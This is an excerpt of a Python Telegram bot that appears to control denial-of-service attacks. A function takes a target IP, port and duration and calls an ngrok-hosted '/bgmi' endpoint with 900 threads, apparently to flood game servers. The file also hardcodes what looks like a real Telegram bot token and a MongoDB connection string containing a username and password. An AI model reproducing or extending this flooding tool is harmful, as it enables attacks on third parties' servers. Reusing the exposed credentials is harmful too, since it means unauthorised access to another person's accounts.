...
TOKEN = '7714340481:AAE6spxc4WxKgzfJQdMomryW1WGwcNw5WWA'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002332502759
CHANNEL_ID = -1002332502759
error_channel_id = -1002332502759
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    for current_file in files:
        try:
            ...
            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packet_size=8&thread=900"
